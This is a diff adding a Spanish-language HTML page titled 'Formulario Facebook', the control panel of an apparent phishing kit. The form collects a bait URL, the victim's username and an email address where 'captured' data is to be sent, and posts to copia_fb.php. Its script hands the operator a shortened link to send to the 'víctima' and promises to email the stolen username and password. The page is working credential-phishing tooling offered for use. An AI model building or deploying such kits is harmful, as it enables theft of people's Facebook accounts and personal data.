@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Formulario Facebook</title>
+  <link rel="stylesheet" href="../css/formulario_fb.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css2?family=Permanent+Marker&display=swap" rel="stylesheet">
+</head>
+
+<body>
+
+  <!-- partial:index.partial.html -->
+  <div class="content">
+    <h1 class="title">Formulario Facebook</h1>
+    <div class="form">
+      <form class="form-container" action="copia_fb.php" method="POST">
+        <div class="form-item col-5">
+          <input class="input" type="url" id="url" name="url" />
+          <label class="label" for="gancho">URL gancho</label>
+        </div>
+        <div class="form-item col-5">
+          <input class="input" type="text" id="usuario" name="usuario" />
+          <label class="label" for="user">Usuario de la victima</label>
+        </div>
+        <div class="form-item">
+          <input class="input" type="email" required="required" id="email" name="email" />
+          <label class="label" for="mail">Mail donde recibir los datos*</label>
+        </div>
+        <!--
+              <div class="form-item">
+                <textarea class="textarea" required="required" id="textarea"></textarea>
+                <label class="label" for="textarea">mensaje</label>
+              </div>
+              -->
+        <div class="form-item">
+          <input class="btn-enviar" onClick="pruebaemail(email.value);" type="submit" value="Crear link" />
+        </div>
+      </form>
+    </div>
+  </div>
+  <!-- partial -->
+
+  <script type="text/javascript">
+
+    function vistavictima() {
+      alert("A continuación pasarás a la vista de la víctima.");
+    }
+
+
+
+
+    function pruebaemail(micorreo) {
+      re = /^([\da-z_\.-]+)@([\da-z\.-]+)\.([a-z\.]{2,6})$/
+      if (!re.exec(micorreo)) {
+        return false;
+      } else {
+        var mascota = prompt("Copia y envía este link a tu víctima", "https://cutt.ly/9cwXk6q");
+        if (mascota != null) {
+          alert("Recuerda que enviaremos a tu mail el usuario y contraseña capturados ");
+          alert("Ahora pasarás a la vista de la víctima");
+        }
+        return true;
+      }
+    }
+
+  </script>
+
+</body>
+
+</html>
